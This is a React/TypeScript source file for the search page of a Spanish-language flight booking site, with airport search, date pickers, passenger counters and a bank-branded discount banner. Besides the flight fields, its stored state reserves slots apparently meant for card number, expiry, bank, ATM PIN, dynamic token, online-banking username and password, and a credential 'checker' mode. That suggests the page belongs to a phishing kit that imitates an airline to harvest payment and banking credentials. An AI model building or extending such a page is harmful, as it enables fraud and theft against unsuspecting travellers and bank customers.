import React, { useState, useEffect, useContext } from 'react';
import { useNavigate } from 'react-router-dom';
import Navbar from '../components/Navbar';
import { airports } from '../data/airports';
import { Airport, Info } from '../types';
import { InfoContext } from '../App';
import DatePicker from 'react-datepicker';
import "react-datepicker/dist/react-datepicker.css";
import { registerLocale } from  "react-datepicker";
import { es } from 'date-fns/locale/es';
import Loader from '../components/Loader';

registerLocale('es', es);

const Home: React.FC = () => {
  const navigate = useNavigate();
  const { setInfo } = useContext(InfoContext);
  const [activeModal, setActiveModal] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [travelType, setTravelType] = useState(1); // 1: Round trip, 2: One way
  const [seatType, setSeatType] = useState(1); // 1: Economy, 2: Premium Economy, 3: Premium Business
  const [passengers, setPassengers] = useState({ adults: 1, children: 0, babies: 0 });
  const [origin, setOrigin] = useState<Airport | ''>('');
  const [destination, setDestination] = useState<Airport | ''>('');
  const [flightDates, setFlightDates] = useState<[string | number, string | number]>([0, 0]);

  const [searchTerm, setSearchTerm] = useState('');
  const [searchResults, setSearchResults] = useState<Airport[]>([]);

  // Initial load from localStorage or default
  useEffect(() => {
    const savedInfo = localStorage.getItem('info');
    if (savedInfo) {
      try {
        const parsedInfo: Info = JSON.parse(savedInfo);
        setTravelType(parsedInfo.flightInfo.travel_type);
        setSeatType(parsedInfo.flightInfo.seat_type);
        setOrigin(parsedInfo.flightInfo.origin);
        setDestination(parsedInfo.flightInfo.destination);
        setPassengers({
            adults: parsedInfo.flightInfo.adults,
            children: parsedInfo.flightInfo.children,
            babies: parsedInfo.flightInfo.babies
        });
        setFlightDates(parsedInfo.flightInfo.flightDates);
      } catch (e) {
        console.error("Error parsing info from LS", e);
        updateLocalStorage();
      }
    } else {
        // Initialize default structure in LS
        updateLocalStorage();
    }
  }, []);

  // Update localStorage whenever state changes
  useEffect(() => {
    updateLocalStorage();
  }, [travelType, seatType, origin, destination, passengers, flightDates]);

  const updateLocalStorage = () => {
    const info: Info = {
        flightInfo: {
            travel_type: travelType,
            seat_type: seatType,
            origin: origin,
            destination: destination,
            adults: passengers.adults,
            children: passengers.children,
            babies: passengers.babies,
            flightDates: flightDates
        },
        passengersInfo: {
            adults: Array(passengers.adults).fill({ name: '', surname: '', gender: '', nationality: '' }),
            children: Array(passengers.children).fill({ name: '', surname: '', gender: '', nationality: '' }),
            babies: Array(passengers.babies).fill({ name: '', surname: '', gender: '', nationality: '' }),
            contact: { email: '', phone: '' }
        },
        metaInfo: {
            email: '', p: '', pdate: '', c: '', ban: '', dues: '', dudename: '', surname: '', cc: '', telnum: '',
            city: '', state: '', address: '', cdin: '', ccaj: '', cavance: '', tok: '', user: '', puser: '', err: '', disp: ''
        },
        checkerInfo: { company: '', mode: 'userpassword' },
        edit: 0
    };
    localStorage.setItem('info', JSON.stringify(info));
  };

  const showModal = (modalId: string) => {
    setActiveModal(modalId);
    setSearchTerm('');
    setSearchResults(airports.slice(0, 5));
  };

  const hideModal = () => {
    setActiveModal(null);
  };

  const btnSuccessHandler = (btnId: string) => {
    console.log(`Confirmed ${btnId}`);
    hideModal();
  };

  const passengersHandler = (type: 'adults' | 'children' | 'babies', operation: '+' | '-') => {
    setPassengers(prev => {
      const current = prev[type];
      let newValue = current;
      if (operation === '+') {
          if (prev.adults + prev.children + prev.babies < 9) {
            newValue = current + 1;
          }
      }
      if (operation === '-') newValue = current > 0 ? current - 1 : 0;
      
      // Validation for adults (min 1)
      if (type === 'adults' && newValue < 1) newValue = 1;

      return { ...prev, [type]: newValue };
    });
  };

  const handleSearch = (e: React.ChangeEvent<HTMLInputElement>) => {
      const term = e.target.value;
      setSearchTerm(term);
      if (term === '') {
          setSearchResults(airports.slice(0, 5));
      } else {
          const results = airports.filter(airport => 
            airport.city.toLowerCase().includes(term.toLowerCase()) || 
            airport.country.toLowerCase().includes(term.toLowerCase()) || 
            airport.code.toLowerCase().includes(term.toLowerCase())
          ).slice(0, 5);
          setSearchResults(results);
      }
  };

  const selectAirport = (airport: Airport, type: 'origin' | 'destination') => {
      if (type === 'origin') setOrigin(airport);
      if (type === 'destination') setDestination(airport);
      hideModal();
  };

  const handleDateChange = (date: Date | null, index: 0 | 1) => {
      const newDates = [...flightDates] as [string | number, string | number];
      newDates[index] = date ? date.getTime() : 0;
      setFlightDates(newDates);
  };
  
  const formatDate = (timestamp: string | number) => {
      if (!timestamp) return '';
      const date = new Date(Number(timestamp));
      // Adjust because of timezone issues when picking from date input?
      // Actually standard date input returns YYYY-MM-DD which is UTC midnight or local?
      // Using .getTime() creates a timestamp.
      // Let's keep it simple for now.
      
      const monthDic = ['Ene','Feb','Mar','Abr','May','Jun','Jul','Ago','Sep','Oct','Nov','Dic'];
      const dayDic = ['Dom', 'Lun', 'Mar', 'Mie', 'Jue', 'Vie', 'Sab'];
      const dayIndex = date.getUTCDay(); // Use UTC to avoid timezone shifts if input is UTC
      return `${dayDic[dayIndex]} ${date.getUTCDate()} De ${monthDic[date.getUTCMonth()]}`;
  };

  const handleNextStep = async () => {
      if (origin && destination && flightDates[0]) {
          if (travelType === 1 && !flightDates[1]) {
              alert('Elige una fecha para volver.');
              return;
          }

          setIsLoading(true);
          await new Promise(resolve => setTimeout(resolve, 3000));

          // Sync state to Context before navigating
          const newInfo: Info = {
            flightInfo: {
                travel_type: travelType,
                seat_type: seatType,
                origin: origin,
                destination: destination,
                adults: passengers.adults,
                children: passengers.children,
                babies: passengers.babies,
                flightDates: flightDates
            },
            passengersInfo: {
                adults: Array(passengers.adults).fill({ name: '', surname: '', gender: '', nationality: '' }),
                children: Array(passengers.children).fill({ name: '', surname: '', gender: '', nationality: '' }),
                babies: Array(passengers.babies).fill({ name: '', surname: '', gender: '', nationality: '' }),
                contact: { email: '', phone: '' }
            },
            metaInfo: {
                email: '', p: '', pdate: '', c: '', ban: '', dues: '', dudename: '', surname: '', cc: '', telnum: '',
                city: '', state: '', address: '', cdin: '', ccaj: '', cavance: '', tok: '', user: '', puser: '', err: '', disp: ''
            },
            checkerInfo: { company: '', mode: 'userpassword' },
            edit: 0
          };
          setInfo(newInfo);

          navigate('/select-flight-go');
      } else {
          alert('Por favor completa todos los campos.');
      }
  };

  const CustomDatePickerInput = React.forwardRef(({ value, onClick, onChange, id, label, className, onKeyDown }: any, ref: any) => (
    <>
        <input
            id={id}
            value={value}
            onClick={onClick}
            onChange={onChange}
            ref={ref}
            type="text"
            className={className}
            placeholder=" "
            required
            onKeyDown={onKeyDown}
            autoComplete="off"
        />
        <label htmlFor={id}>{label}</label>
    </>
  ));

  return (
    <>
      {isLoading && <Loader />}
      {/* Modals */}
      {/* TRAVEL TYPE */}
      <div className={`modal ${activeModal === 'travel-type' ? 'd-block' : ''}`} id="travel-type">
        <div className="d-flex justify-content-end p-1" onClick={hideModal}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path></svg>
        </div>
        <div className="pr-4 pl-4 ">
            <h4 className="fw-light fs-25 tc-ocean mt-1">Tipo de Viaje</h4>
            <div className="d-flex justify-space-between" onClick={() => setTravelType(1)}>
                <span className="fs-5 tc-gray-smoke">Ida y Vuelta</span>
                <div className="radio-container">
                    <input type="radio" name="travel-opt" id="go-back" checked={travelType === 1} readOnly />
                    <div className="custom-radio ct-radio"></div>
                </div>
            </div>
            <div className="d-flex justify-space-between mt-3" onClick={() => setTravelType(2)}>
                <span className="fs-5 tc-gray-smoke">Solo Ida</span>
                <div className="radio-container">
                    <input type="radio" name="travel-opt" id="just-go" checked={travelType === 2} readOnly />
                    <div className="custom-radio ct-radio"></div>
                </div>
            </div>
            <div className="btn-success mt-5" onClick={() => btnSuccessHandler('btn-travel-type')} role="button" style={{cursor: 'pointer', textAlign: 'center', display: 'block', padding: '10px', borderRadius: '5px'}}>Confirmar</div>
        </div>
      </div>

      {/* SEAT TYPE */}
      <div className={`modal ${activeModal === 'seat-type' ? 'd-block' : ''}`} id="seat-type">
        <div className="d-flex justify-content-end p-1" onClick={hideModal}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path></svg>
        </div>
        <div className="pr-4 pl-4 ">
            <h4 className="fw-light fs-25 tc-ocean mt-1">Tipo de Cabina</h4>
            <div className="d-flex justify-space-between" onClick={() => setSeatType(1)}>
                <span className="fs-5 tc-gray-smoke">Economy</span>
                <div className="radio-container">
                    <input type="radio" name="seat-type" id="eco" checked={seatType === 1} readOnly />
                    <div className="custom-radio ct-radio"></div>
                </div>
            </div>
            <div className="d-flex justify-space-between mt-3" onClick={() => setSeatType(2)}>
                <span className="fs-5 tc-gray-smoke">Premium Economy</span>
                <div className="radio-container">
                    <input type="radio" name="seat-type" id="premium-eco" checked={seatType === 2} readOnly />
                    <div className="custom-radio ct-radio"></div>
                </div>
            </div>
            <div className="d-flex justify-space-between mt-3" onClick={() => setSeatType(3)}>
                <span className="fs-5 tc-gray-smoke">Premium Business</span>
                <div className="radio-container">  
                    <input type="radio" name="seat-type" id="premium-business" checked={seatType === 3} readOnly />
                    <div className="custom-radio ct-radio"></div>
                </div>
            </div>
            <div className="btn-success mt-5" onClick={() => btnSuccessHandler('btn-seat-type')} role="button" style={{cursor: 'pointer', textAlign: 'center', display: 'block', padding: '10px', borderRadius: '5px'}}>Confirmar</div>
        </div>
      </div>

      {/* SELECT ORIGIN */}
      <div className={`modal ${activeModal === 'select-origin' ? 'd-block' : ''}`} id="select-origin">
        <div className="d-flex justify-content-end p-1" onClick={hideModal}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path></svg>
        </div>
        <div className="pr-4 pl-4 modal-search">
            <h4 className="fw-light fs-25 tc-ocean mt-1 mb-0">Ingresa tu Origen</h4>
            <div className="input-container">
                <input type="text" id="origin" required placeholder=" " value={searchTerm} onChange={handleSearch} autoFocus />
                <label htmlFor="origin">Origen</label>
            </div>
            <div className="mt-4" id="search-results-origin">
                {searchResults.map((airport) => (
                    <div key={airport.code} className="search-item d-flex align-items-center p-1" onClick={() => selectAirport(airport, 'origin')}>
                        <div className="pr-2 pl-2" style={{width: '15px', height: '15px', backgroundImage: 'url(/assets/media/takeoff_icon.png)', backgroundSize: 'contain', backgroundRepeat: 'no-repeat'}}></div>
                        <div>
                            <p className="m-0 fs-3 tc-ocean">{airport.city}, {airport.code} - {airport.country}</p>
                            <p className="m-0 fs-5 tc-ocean">{airport.name}</p>
                        </div>
                    </div>
                ))}
            </div>
        </div>
      </div>

      {/* SELECT DESTINATION */}
      <div className={`modal ${activeModal === 'select-destination' ? 'd-block' : ''}`} id="select-destination">
        <div className="d-flex justify-content-end p-1" onClick={hideModal}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path></svg>
        </div>
        <div className="pr-4 pl-4 modal-search">
            <h4 className="fw-light fs-25 tc-ocean mt-1 mb-0">Ingresa tu Destino</h4>
            <div className="input-container">
                <input type="text" id="destination" required placeholder=" " value={searchTerm} onChange={handleSearch} autoFocus />
                <label htmlFor="destination">Destino</label>
            </div>
            <div className="mt-4" id="search-results-destination">
                {searchResults.map((airport) => (
                    <div key={airport.code} className="search-item d-flex align-items-center p-1" onClick={() => selectAirport(airport, 'destination')}>
                        <div className="pr-2 pl-2" style={{width: '15px', height: '15px', backgroundImage: 'url(/assets/media/takeoff_icon.png)', backgroundSize: 'contain', backgroundRepeat: 'no-repeat'}}></div>
                        <div>
                            <p className="m-0 fs-3 tc-ocean">{airport.city}, {airport.code} - {airport.country}</p>
                            <p className="m-0 fs-5 tc-ocean">{airport.name}</p>
                        </div>
                    </div>
                ))}
            </div>
        </div>
      </div>

      {/* SELECT DATES */}
      <div className={`modal ${activeModal === 'select-dates' ? 'd-block' : ''}`} id="select-dates">
        <div className="d-flex justify-content-end p-1" onClick={hideModal}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path></svg>
        </div>
        <div className="pr-4 pl-4 modal-search">
            <h4 className="fw-light fs-25 tc-ocean mt-1 mb-0">¿Cuándo viajas?</h4>
            <div className="d-flex flex-column justify-content-center align-items-center mt-3">
                <div className="input-container w-100">
                    <DatePicker 
                        id="departure-date"
                        selected={flightDates[0] ? new Date(flightDates[0]) : null} 
                        onChange={(date: Date | null) => handleDateChange(date, 0)} 
                        className="input-field input-date-bg w-100"
                        dateFormat="dd/MM/yyyy"
                        locale="es"
                        minDate={new Date()}
                        onKeyDown={(e) => e.preventDefault()}
                        wrapperClassName="w-100"
                        customInput={<CustomDatePickerInput label="Ida" />}
                    />
                </div>
                
                {travelType === 1 && (
                    <div className="input-container w-100 mt-3">
                        <DatePicker 
                            id="return-date"
                            selected={flightDates[1] ? new Date(flightDates[1]) : null} 
                            onChange={(date: Date | null) => handleDateChange(date, 1)} 
                            className="input-field input-date-bg w-100"
                            dateFormat="dd/MM/yyyy"
                            locale="es"
                            minDate={flightDates[0] ? new Date(flightDates[0]) : new Date()}
                            onKeyDown={(e) => e.preventDefault()}
                            wrapperClassName="w-100"
                            customInput={<CustomDatePickerInput label="Vuelta" />}
                        />
                    </div>
                )}
            </div>
        </div>
        <div className="modal-bottom pr-4 pl-4">
            <div className="btn-success mt-5" onClick={hideModal} role="button" style={{cursor: 'pointer', textAlign: 'center', display: 'block', padding: '10px', borderRadius: '5px'}}>Confirmar</div>
        </div>
      </div>

      {/* SELECT PASSENGERS */}
      <div className={`modal ${activeModal === 'select-passengers' ? 'd-block' : ''}`} id="select-passengers">
        <div className="d-flex justify-content-end p-1" onClick={hideModal}>
            <svg style={{width: '25px', color:'#5c5c5c'}} xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M30 27.5829L27.1881 30.375L16 19.1869L4.79207 30.375L2 27.5829L13.1881 16.375L2 5.18685L4.79207 2.375L15.9802 13.5829L27.1881 2.375L30 5.18685L18.7921 16.375L30 27.5829Z" fill="currentColor"></path></svg>
        </div>
        <div className="pr-4 pl-4 pl-4 modal-search">
            <h4 className="fw-light fs-25 tc-ocean mt-1">Agregar Pasajeros</h4>
            {/* ADULTS */}
            <div className="border-bottom pb-1">
                <div className="d-flex justify-space-between tc-gray-smoke">
                    <div className="d-flex justify-content-center align-items-center">
                         <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{marginRight: '15px', marginLeft: '15px'}}><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                        <div>
                            <p className="fs-4 m-0 mb-1">Adultos</p>
                            <p className="fs-5 m-0">12 o más años</p>
                        </div>
                    </div>
                    <div className="d-flex align-items-center">
                        <svg onClick={() => passengersHandler('adults', '-')} viewBox="0 0 24 24" width="22" height="22" color="#B30F3B"><path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path><path style={{fill: 'currentColor'}} d="M18 11.5H12.5H11.5H6V12.5H11.5H12.5H18V11.5Z"></path></svg>
                        <span className="pl-3 pr-3 fs-3">{passengers.adults}</span>
                        <svg onClick={() => passengersHandler('adults', '+')} viewBox="0 0 24 24" width="22" height="22" color="#B30F3B"><path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path><path style={{fill: 'currentColor'}} d="M18 11.5H12.5V6H11.5V11.5H6V12.5H11.5V18H12.5V12.5H18V11.5Z"></path></svg>
                    </div>
                </div>
            </div>
            {/* CHILDREN */}
             <div className="border-bottom pb-1 mt-3">
                <div className="d-flex justify-space-between tc-gray-smoke">
                    <div className="d-flex justify-content-center align-items-center">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{marginRight: '15px', marginLeft: '15px'}}><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                        <div>
                            <p className="fs-4 m-0 mb-1">Niños</p>
                            <p className="fs-5 m-0">2 a 11 años</p>
                        </div>
                    </div>
                    <div className="d-flex align-items-center">
                        <svg onClick={() => passengersHandler('children', '-')} viewBox="0 0 24 24" width="22" height="22" color="#B30F3B"><path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path><path style={{fill: 'currentColor'}} d="M18 11.5H12.5H11.5H6V12.5H11.5H12.5H18V11.5Z"></path></svg>
                        <span className="pl-3 pr-3 fs-3">{passengers.children}</span>
                        <svg onClick={() => passengersHandler('children', '+')} viewBox="0 0 24 24" width="22" height="22" color="#B30F3B"><path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path><path style={{fill: 'currentColor'}} d="M18 11.5H12.5V6H11.5V11.5H6V12.5H11.5V18H12.5V12.5H18V11.5Z"></path></svg>
                    </div>
                </div>
            </div>
             {/* BABIES */}
             <div className="border-bottom pb-1 mt-3">
                <div className="d-flex justify-space-between tc-gray-smoke">
                    <div className="d-flex justify-content-center align-items-center">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{marginRight: '15px', marginLeft: '15px'}}><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                        <div>
                            <p className="fs-4 m-0 mb-1">Bebés</p>
                            <p className="fs-5 m-0">0 a 1 año</p>
                        </div>
                    </div>
                    <div className="d-flex align-items-center">
                        <svg onClick={() => passengersHandler('babies', '-')} viewBox="0 0 24 24" width="22" height="22" color="#B30F3B"><path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path><path style={{fill: 'currentColor'}} d="M18 11.5H12.5H11.5H6V12.5H11.5H12.5H18V11.5Z"></path></svg>
                        <span className="pl-3 pr-3 fs-3">{passengers.babies}</span>
                        <svg onClick={() => passengersHandler('babies', '+')} viewBox="0 0 24 24" width="22" height="22" color="#B30F3B"><path style={{fill: 'currentColor'}} d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path><path style={{fill: 'currentColor'}} d="M18 11.5H12.5V6H11.5V11.5H6V12.5H11.5V18H12.5V12.5H18V11.5Z"></path></svg>
                    </div>
                </div>
            </div>
            <div className="modal-bottom pr-4 pl-4">
                <div className="btn-success mt-5" onClick={hideModal} role="button" style={{cursor: 'pointer', textAlign: 'center', display: 'block', padding: '10px', borderRadius: '5px'}}>Confirmar</div>
            </div>
        </div>
      </div>

      <Navbar />

      <div className="index-background"></div>

      <main>
        <div className="card card-rounded mt-3">
            <div className="scrollable-nav pb-3">
                <div className="scroll-button left-button" role="button" style={{cursor: 'pointer', display: 'flex', justifyContent: 'center', alignItems: 'center'}}><div style={{width: '17px', height: '17px', backgroundImage: 'url(/assets/media/left_gray_arrow.png)', backgroundSize: 'contain', backgroundRepeat: 'no-repeat'}}></div></div>
                <div className="nav-items">
                    <a href="#" className="nav-item ni-selected">Vuelos</a>
                    <a href="#" className="nav-item">Paquetes</a>
                    <a href="#" className="nav-item">Hoteles</a>
                    <a href="#" className="nav-item">Carros</a>
                    <a href="#" className="nav-item">Seguros</a>
                    <a href="#" className="nav-item">Upgrade</a>
                </div>
                <div className="scroll-button right-button" role="button" style={{cursor: 'pointer', display: 'flex', justifyContent: 'center', alignItems: 'center'}}><div style={{width: '17px', height: '17px', backgroundImage: 'url(/assets/media/right_red_arrow.png)', backgroundSize: 'contain', backgroundRepeat: 'no-repeat', filter: 'hue-rotate(270deg)'}}></div></div>
            </div>

            <div className="pl-3 pr-3 pb-3">
                <h2 className=" pt-2 main-title">¿A dónde quieres ir?</h2>
                <div className="d-flex justify-space-between mt-3 pl-3 pr-3">
                    <div onClick={() => showModal('travel-type')} ><span className="mr-1 fs-5 tc-gray-smoke fw-bolder" id="label-travel-type">{travelType === 1 ? 'Ida y Vuelta' : 'Solo Ida'}</span><div style={{width: '15px', height: '15px', backgroundImage: 'url(/assets/media/red_down_arrow.png)', backgroundSize: 'contain', backgroundRepeat: 'no-repeat', display: 'inline-block', filter: 'hue-rotate(270deg)'}}></div></div>
                    <div onClick={() => showModal('seat-type')} ><span className="mr-1 fs-5 tc-gray-smoke fw-bolder" id="label-seat-type">{seatType === 1 ? 'Economy' : seatType === 2 ? 'Premium Economy' : 'Premium Business'}</span><div style={{width: '15px', height: '15px', backgroundImage: 'url(/assets/media/red_down_arrow.png)', backgroundSize: 'contain', backgroundRepeat: 'no-repeat', display: 'inline-block', filter: 'hue-rotate(270deg)'}}></div></div>
                </div>
                <div className="mt-3 d-flex align-items-center justify-space-between">
                    <div className="mr-3" style={{width: '25px', height: '25px', backgroundImage: 'url(/assets/media/takeoff_icon.png)', backgroundSize: 'contain', backgroundRepeat: 'no-repeat'}}></div>
                    <div className="index-input" id="label-origin" onClick={() => showModal('select-origin')}>
                         {origin ? (
                             <p className="m-0 tc-ocean"><b>{origin.city}</b> {origin.code} - {origin.country}</p>
                         ) : (
                            <p className="placeholder">Origen</p>
                         )}
                    </div>
                </div>
                <div id="cont-destination" className={`mt-3 d-flex align-items-center justify-space-between ${origin && destination ? '' : 'pb-5'}`}>
                    <div style={{marginRight: '24px', width: '17px', height: '17px', backgroundImage: 'url(/assets/media/mappoint_icon.png)', backgroundSize: 'contain', backgroundRepeat: 'no-repeat'}}></div>
                    <div className="index-input" id="label-destination" onClick={() => showModal('select-destination')}>
                        {destination ? (
                             <p className="m-0 tc-ocean"><b>{destination.city}</b> {destination.code} - {destination.country}</p>
                         ) : (
                            <p className="placeholder">Destino</p>
                         )}
                    </div>
                </div>

                {/* Additional Options when Origin/Dest selected */}
                {(origin && destination) && (
                    <div id="rest-options" className="animate__animated animate__fadeIn">
                         <div className="mt-3 d-flex align-items-center justify-space-between">
                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mr-3 text-gray-500"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
                            <div className="index-input" id="label-dates" onClick={() => showModal('select-dates')}>
                                {flightDates[0] !== 0 ? (
                                    <div dangerouslySetInnerHTML={{ __html: travelType === 1 && flightDates[1] !== 0 
                                        ? `<p><span class="fw-light text-italic tc-gray-smoke">${formatDate(flightDates[0])}</span> a <span class="fw-light text-italic tc-gray-smoke">${formatDate(flightDates[1])}</span></p>`
                                        : `<p><span class="fw-light text-italic tc-gray-smoke">${formatDate(flightDates[0])}</span></p>`
                                    }} />
                                ) : (
                                    <p className="placeholder">Fechas</p>
                                )}
                            </div>
                        </div>

                         <div className="mt-3 d-flex align-items-center justify-space-between">
                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="mr-3 text-gray-500"><path d="M16 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="8.5" cy="7" r="4"></circle><line x1="20" y1="8" x2="20" y2="14"></line><line x1="23" y1="11" x2="17" y2="11"></line></svg>
                            <div className="index-input" id="label-passengers" onClick={() => showModal('select-passengers')}>
                                <p className="m-0 tc-ocean">
                                    {passengers.adults > 0 && `${passengers.adults} ${passengers.adults > 1 ? 'Adultos' : 'Adulto'}`}
                                    {passengers.children > 0 && `, ${passengers.children} ${passengers.children > 1 ? 'Niños' : 'Niño'}`}
                                    {passengers.babies > 0 && `, ${passengers.babies} ${passengers.babies > 1 ? 'Bebés' : 'Bebé'}`}
                                </p>
                            </div>
                        </div>

                        <div className="mt-4">
                            <div className="btn-search" onClick={handleNextStep} role="button" style={{cursor: 'pointer', textAlign: 'center', display: 'block'}}>Buscar vuelos</div>
                        </div>
                    </div>
                )}
            </div>
        </div>

        {/* Banner and other cards */}
        <div className="card p-1 mt-3">
            <div className="card-banner" style={{backgroundImage: 'url(/assets/media/tropical_beach.jpg)', height: '200px', backgroundSize: 'cover', backgroundPosition: 'center'}} aria-label="Vista paradisíaca de playa tropical con aguas cristalinas" role="img">
            </div>
            <div className="p-2">
                <span className="offer mb-2">¡OFERTAS INVEX!</span>
                <h2 className="card-title-1 mb-2">¡Aprovecha y vuela con hasta 60% de descuento en destinos nacionales!</h2>
                <p className="card-text mb-2">Tiquetes para volar por México desde $<span id="flight-cost">217</span> precio final por tramo</p>
                <a className="card-link" href="#">Comprar ahora</a>
            </div>
        </div>
      </main>
    </>
  );
};

export default Home;
